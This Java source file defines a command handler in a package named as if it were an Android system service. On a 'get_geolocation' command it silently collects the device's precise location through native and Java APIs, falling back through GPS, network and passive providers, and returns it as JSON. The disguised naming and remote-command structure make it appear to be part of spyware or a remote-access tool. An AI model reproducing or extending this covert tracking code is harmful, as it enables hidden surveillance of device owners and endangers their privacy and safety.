package com.android.systemservice;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Looper;
import android.util.Log;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.TimeZone;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class CommandHandler {
    private static final String TAG = "SystemService";
    private final Context ctx;

    public CommandHandler(Context ctx) {
        this.ctx = ctx;
    }

    String handle(String command) {
        switch (command) {
            case "get_geolocation":
                return handleGetGeolocation();
            default:
                Log.w(TAG, "Unknown command: " + command);
                return null;
        }
    }

    private String handleGetGeolocation() {
        try {
            String geoStr = NativeBridge.getGeolocationNative();
            if (geoStr != null) {
                JSONObject geo = new JSONObject(geoStr);
                if (geo.has("latitude")) {
                    Log.d(TAG, "Native geolocation: " + geoStr);
                    return geoStr;
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Native geolocation failed, falling back to Java API", e);
        }
        return getGeolocationJava();
    }

    private String getGeolocationJava() {
        LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        if (lm == null) return null;

        Location last = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        if (last == null) last = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        if (last == null) last = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);

        if (last == null) {
            last = requestSingleUpdate(lm);
        }

        if (last == null) return null;

        try {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
            sdf.setTimeZone(TimeZone.getTimeZone("UTC"));

            JSONObject obj = new JSONObject();
            obj.put("latitude", last.getLatitude());
            obj.put("longitude", last.getLongitude());
            obj.put("altitude", last.getAltitude());
            obj.put("accuracy", last.getAccuracy());
            obj.put("provider", last.getProvider());
            obj.put("timestamp", sdf.format(new Date(last.getTime())));
            return obj.toString();
        } catch (Exception e) {
            Log.e(TAG, "Failed to build location JSON", e);
            return null;
        }
    }

    private Location requestSingleUpdate(LocationManager lm) {
        try {
            final CountDownLatch latch = new CountDownLatch(1);
            final Location[] result = new Location[1];

            LocationListener listener = new LocationListener() {
                @Override public void onLocationChanged(Location loc) {
                    result[0] = loc;
                    latch.countDown();
                }
                @Override public void onStatusChanged(String p, int s, Bundle e) {}
                @Override public void onProviderEnabled(String p) {}
                @Override public void onProviderDisabled(String p) { latch.countDown(); }
            };

            Looper looper = Looper.myLooper();
            if (looper == null) Looper.prepare();

            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, looper);
            } else if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, looper);
            } else {
                return null;
            }

            latch.await(30, TimeUnit.SECONDS);
            lm.removeUpdates(listener);
            return result[0];
        } catch (Exception e) {
            Log.e(TAG, "requestSingleUpdate failed", e);
            return null;
        }
    }
}
